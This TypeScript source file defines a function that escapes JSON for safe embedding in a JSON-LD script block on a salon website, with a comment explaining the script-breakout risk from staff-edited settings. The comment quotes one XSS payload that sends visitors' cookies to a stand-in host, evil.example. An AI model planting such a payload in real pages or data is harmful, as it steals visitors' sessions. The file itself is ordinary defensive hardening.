/**
 * Serialising data for a `<script type="application/ld+json">` block.
 *
 * `JSON.stringify` alone is not safe to drop inside a `<script>` element, because the HTML parser
 * is not looking for JSON — it is looking for the literal characters `</script`. A string value
 * containing that sequence ends the block early and everything after it is parsed as markup.
 *
 * That matters here because the structured-data block in `app/(public)/layout.tsx` is built partly
 * from `salon_settings`: the phone number, email, street address and the three social URLs are all
 * free text typed into the staff console. A value like
 *
 *     </script><script>fetch('https://evil.example/'+document.cookie)</script>
 *
 * would therefore run on every public page for every visitor, from data that was merely saved in a
 * settings form. Today only staff can write those fields, which is why this is hardening rather
 * than an open door — but "only staff can write it" stops being true the moment any of it becomes
 * customer-editable, and the fix costs one function.
 *
 * The escapes below are the standard set, each written as a JSON escape so the result stays valid
 * JSON that `JSON.parse` round-trips exactly:
 *
 *   • `<`      → `\u003c`  — the one that actually defuses `</script`. Also covers `<!--`, which
 *                            starts an HTML comment and can swallow the rest of the document.
 *   • `>`      → `\u003e`  — belt and braces for the closing sequence.
 *   • `&`      → `\u0026`  — prevents entity decoding inside the block.
 *   • U+2028   → `\u2028`
 *   • U+2029   → `\u2029`  — the two line separators. Legal in JSON strings but historically illegal
 *                            in JavaScript ones, so an unescaped one was a syntax error that took
 *                            the rest of the page's scripts down with it.
 */
export function serializeJsonLd(value: unknown): string {
  return JSON.stringify(value)
    .replace(/</g, '\\u003c')
    .replace(/>/g, '\\u003e')
    .replace(/&/g, '\\u0026')
    .replace(/\u2028/g, '\\u2028')
    .replace(/\u2029/g, '\\u2029');
}
